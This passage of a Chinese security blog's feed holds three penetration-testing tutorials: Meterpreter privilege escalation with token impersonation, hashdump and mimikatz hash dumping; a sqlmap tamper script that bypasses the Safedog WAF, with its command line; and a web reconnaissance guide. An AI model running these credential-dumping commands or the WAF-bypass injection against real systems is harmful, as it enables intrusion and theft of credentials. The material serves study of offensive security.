Label\Medium Mandatory Level Label</li><li>管理员：Mandatory Label\High Mandatory Level Label</li></ul><h4 id="查看系统的已打补丁"><a href="#查看系统的已打补丁" class="headerlink" title="查看系统的已打补丁"></a>查看系统的已打补丁</h4><ul><li>Hotfix(s):为修补程序</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><ul><li>或者查询C:\windows\里留下的补丁号”.log”</li></ul><h4 id="Wmic查看系统补丁"><a href="#Wmic查看系统补丁" class="headerlink" title="Wmic查看系统补丁"></a>Wmic查看系统补丁</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="meterpreter提权"><a href="#meterpreter提权" class="headerlink" title="meterpreter提权"></a>meterpreter提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; getsystem</span><br></pre></td></tr></table></figure><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>使用token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br></pre></td></tr></table></figure><p>列出可用的token</p><ul><li>令牌类型<ul><li>Delegation Tokens          授权令牌</li><li>Impersonation                 模拟令牌</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_tokens -u</span><br></pre></td></tr></table></figure><p>如果获取的列表里面有管理员令牌，调用impersonate_token命令假冒Administrator用户进行攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token WIN-57TJ4B561MT\\Administrator</span><br></pre></td></tr></table></figure><h4 id="获取哈希值"><a href="#获取哈希值" class="headerlink" title="获取哈希值"></a>获取哈希值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure><ul><li>在非system权限下运行hashdump命令会失败，而且在windows 7、windows Server 2008下有时候会出现进程移植不成功等问题；而另一个模块smart_hashdump的功能更强大，可以导出所有域用户的hash</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows&#x2F;gather&#x2F;smart_hashdump</span><br></pre></td></tr></table></figure><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>加载mimikatz模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br></pre></td></tr></table></figure><p>查看帮助</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help mimikatz</span><br></pre></td></tr></table></figure><p>抓取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msv</span><br></pre></td></tr></table></figure><p>查看全部功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f a::</span><br></pre></td></tr></table></figure><p>抓取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure><p>——   参考来源《Web安全攻防》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;五大模块&quot;&gt;&lt;a href=&quot;#五大模块&quot; class=&quot;headerlink&quot; title=&quot;五大模块&quot;&gt;&lt;/a&gt;五大模块&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    <category term="工具使用" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="内网" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>tamper 安全狗的绕过</title>
    <link href="http://example.com/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/</id>
    <published>2021-01-04T16:00:00.000Z</published>
    <updated>2021-03-09T09:40:27.078Z</updated>
    
    <content type="html"><![CDATA[<p>使用sqlmap编写绕过安全狗的tamper，代码如下。</p><p>将写好的文件放在sqlmap的tamper下，如果是新创建文件夹，需要复制__init__.py放在新建的文件夹中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">安全狗绕过</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ &#x3D; PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line"></span><br><span class="line">retVal &#x3D; payload</span><br><span class="line"></span><br><span class="line">if payload:</span><br><span class="line"># 将payload参数中的所有空格替换进行绕过</span><br><span class="line">    retVal &#x3D; retVal.replace(&#39; &#39;, &#39;&#x2F;*!99999sadadad*&#x2F;%23%0a&#39;)</span><br><span class="line"></span><br><span class="line">return retVal</span><br></pre></td></tr></table></figure><p>使用命令：python sqlmap.py -u http://漏洞站点/?id=1 –batch –purge –technique=U –tamper “tamper脚本.py” –dbs</p><ul><li>其中–tamper指定写好的脚本路径，–technique指定注入方式，U表示联合注入</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用sqlmap编写绕过安全狗的tamper，代码如下。&lt;/p&gt;
&lt;p&gt;将写好的文件放在sqlmap的tamper下，如果是新创建文件夹，需要复制__init__.py放在新建的文件夹中。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>web 信息收集</title>
    <link href="http://example.com/2021/01/03/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2021/01/03/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-01-02T16:00:00.000Z</published>
    <updated>2021-03-09T09:42:50.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主动和被动"><a href="#主动和被动" class="headerlink" title="主动和被动"></a>主动和被动</h2><ul><li>主动信息收集：通过直接访问、扫描网站，这种流量将流经网站</li><li>被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google搜索、Shodan搜索等</li></ul><h2 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h2><p>当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。</p><h4 id="判断域名对应的ip"><a href="#判断域名对应的ip" class="headerlink" title="判断域名对应的ip"></a>判断域名对应的ip</h4><ul><li>判断该域名是否存在CDN，可以去在线CDN查询网站，如果查询的ip数量大于一个的，说明不是真实的服务器地址</li><li>如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。</li></ul><p>在线CDN查询网站</p><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> </p></blockquote><h4 id="判断是否有CDN"><a href="#判断是否有CDN" class="headerlink" title="判断是否有CDN"></a>判断是否有CDN</h4><ul><li>使用不同地方的ping服务，查看对应ip地址是否唯一，如果不唯一则极可能是使用了CND</li><li>ping测试网站</li></ul><blockquote><p><a href="https://wepcc.com/">https://wepcc.com/</a><br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p></blockquote><p><strong>(1)查询子域名：</strong>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。传送门——&gt; <a href="https://blog.csdn.net/qq_36119192/article/details/84068625#%E5%AD%90%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2">子域名信息查询</a></p><p><strong>(2)查询主域名</strong>：以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。</p><p><strong>(3)邮件服务器：</strong>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。</p><p><strong>(4)查看域名历史解析记录：</strong>也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站<a href="https://www.netcraft.com/">https://www.netcraft.com</a> 来观察域名的IP历史记录。</p><p><strong>(5)查看域名历史解析记录</strong>：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站<a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a> 访问 ，可能会得到真实的ip地址。</p><p><strong>(6)Nslookup查询</strong>：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。传送门：<a href="https://blog.csdn.net/qq_36119192/article/details/82752515#%E5%90%84%E7%A7%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95">各种解析记录</a></p><p><strong>(7)网站漏洞</strong>：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址</p><p><strong>(8)Censys查询SSL证书找到真实IP：</strong>利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在<a href="https://crt.sh上查找目标网站ssl证书的hash,然后再用censys搜索该hash即可得到真实ip地址./">https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。</a></p><h4 id="域名的whois信息"><a href="#域名的whois信息" class="headerlink" title="域名的whois信息"></a>域名的whois信息</h4><ul><li><p>whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。</p><p>-通常，我们进行whois查询是去： <a href="http://whois.chinaz.com/">站长之家whois查询</a></p></li></ul><h4 id="子域名信息查询"><a href="#子域名信息查询" class="headerlink" title="子域名信息查询"></a>子域名信息查询</h4><h5 id="layer子域名爆破机，获取如下"><a href="#layer子域名爆破机，获取如下" class="headerlink" title="layer子域名爆破机，获取如下"></a>layer子域名爆破机，获取如下</h5><blockquote><p>链接:  <a href="https://pan.baidu.com/s/1IS1QCeb6vPIpabBr3LBJ6w">https://pan.baidu.com/s/1IS1QCeb6vPIpabBr3LBJ6w</a>   提取码: w749 </p></blockquote><h5 id="subDomainBrute"><a href="#subDomainBrute" class="headerlink" title="subDomainBrute"></a>subDomainBrute</h5><ul><li>subDomainBrute的特点是可以用小字典递归的发现三级域名、四级域名、甚至五级域名等不容易被探测到的域名。</li></ul><blockquote><p><a href="https://www.freebuf.com/sectool/106625.html">https://www.freebuf.com/sectool/106625.html</a> //使用方式如下链接</p></blockquote><h5 id="goole查询"><a href="#goole查询" class="headerlink" title="goole查询"></a>goole查询</h5><blockquote><p>site:baidu.com -www</p></blockquote><h5 id="HTTP证书查询"><a href="#HTTP证书查询" class="headerlink" title="HTTP证书查询"></a>HTTP证书查询</h5><ul><li>证书透明度(Certificate Transparency)是证书授权机构的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。在线网站：<a href="https://crt.sh/">https://crt.sh</a> </li></ul><h2 id="公司敏感信息网上收集"><a href="#公司敏感信息网上收集" class="headerlink" title="公司敏感信息网上收集"></a>公司敏感信息网上收集</h2><ul><li>当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如：公司的邮箱，员工的姓名，以及与该公司有关的任何信息。还可以去github，码云等平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息，邮箱密码，还有可能有泄露的源代码等</li></ul><h2 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h2><ul><li>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。</li><li>常见的网站指纹识别工具有：whatweb等。</li></ul><p>在线指纹识别网站：</p><blockquote><p>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a></p></blockquote><h2 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h2><h4 id="服务器类型（windows、linux）"><a href="#服务器类型（windows、linux）" class="headerlink" title="服务器类型（windows、linux）"></a>服务器类型（windows、linux）</h4><ul><li>ping命令探测，windows的TTL值一般都是128，linux则是64，大于100的肯定是windows，而几十的肯定是linux。</li><li>但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping</li><li>而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来</li></ul><blockquote><p>namp -O 192.168.10.30</p></blockquote><h4 id="网站容器（apache、nginx、tomcat、IIS）"><a href="#网站容器（apache、nginx、tomcat、IIS）" class="headerlink" title="网站容器（apache、nginx、tomcat、IIS）"></a>网站容器（apache、nginx、tomcat、IIS）</h4><ul><li>知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</li></ul><h4 id="脚本类型（php、jsp、asp、aspx）"><a href="#脚本类型（php、jsp、asp、aspx）" class="headerlink" title="脚本类型（php、jsp、asp、aspx）"></a>脚本类型（php、jsp、asp、aspx）</h4><ul><li>根据网站的URL来判断</li><li>site:xxx filetype:php</li><li>根据wappalyer插件来判断</li></ul><h4 id="数据库类型（mysql、oracle、accsee、sqlserver）"><a href="#数据库类型（mysql、oracle、accsee、sqlserver）" class="headerlink" title="数据库类型（mysql、oracle、accsee、sqlserver）"></a>数据库类型（mysql、oracle、accsee、sqlserver）</h4><p><em><strong>*几种数据库的区别：*</strong></em></p><ul><li><strong>Access</strong> 小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb  一般是asp的网页文件用access数据库 </li><li><strong>SQL Serve</strong>r是一个比较大型的数据库。端口号为<strong>1433</strong>。数据库后缀名 .mdf</li><li><strong>MySQL</strong> 是一个关系型数据库管理系统，MySQL数据库大部分是php的页面。默认端口是<strong>3306</strong></li><li><strong>Oracle</strong>是一款关系数据库管理系统。常用于比较大的网站。默认端口是<strong>1521</strong></li></ul><p><strong>常见搭配：</strong></p><ul><li>ASP 和 ASPX：ACCESS、SQL Server</li><li>PHP：MySQL、PostgreSQL</li><li>JSP：Oracle、MySQL</li></ul><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><p>对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。</p><p>主机扫描的工具也有很多，比如：Nessus </p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：</p><ul><li>22   ssh弱口令</li><li>873  rsync未授权访问漏洞</li><li>3306  mysql弱口令</li><li>6379  redis未授权访问漏洞</li></ul><p>端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。</p><h2 id="网站敏感目录和文件"><a href="#网站敏感目录和文件" class="headerlink" title="网站敏感目录和文件"></a>网站敏感目录和文件</h2><p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p><ul><li>后台目录：弱口令，万能密码，爆破</li><li>安装包：获取数据库信息，甚至是网站源码</li><li>上传目录：截断、上传图片马等</li><li>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</li><li>安装页面 ：可以二次安装进而绕过</li><li>phpinfo：会把你配置的各种信息暴露出来</li><li>编辑器：fck、ke、等</li><li>iis短文件利用：条件比较苛刻 windows、apache等</li><li>robots.txt，防止Goole hack的威胁 </li></ul><p>探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等</p><h2 id="旁站和C段扫描"><a href="#旁站和C段扫描" class="headerlink" title="旁站和C段扫描"></a>旁站和C段扫描</h2><ul><li>旁站指的是同一服务器上的其他网站</li><li>C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器</li></ul><p>旁站和C段在线查询地址：</p><blockquote><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a><br><a href="https://phpinfo.me/bing.php">https://phpinfo.me/bing.php</a></p></blockquote><h2 id="网站漏洞扫描"><a href="#网站漏洞扫描" class="headerlink" title="网站漏洞扫描"></a>网站漏洞扫描</h2><p>网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等</p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ul><li><a href="https://xie1997.blog.csdn.net/article/details/84027438">https://xie1997.blog.csdn.net/article/details/84027438</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;主动和被动&quot;&gt;&lt;a href=&quot;#主动和被动&quot; class=&quot;headerlink&quot; title=&quot;主动和被动&quot;&gt;&lt;/a&gt;主动和被动&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;主动信息收集：通过直接访问、扫描网站，这种流量将流经网站&lt;/li&gt;
&lt;li&gt;被动信息收集：利用第三方的服</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
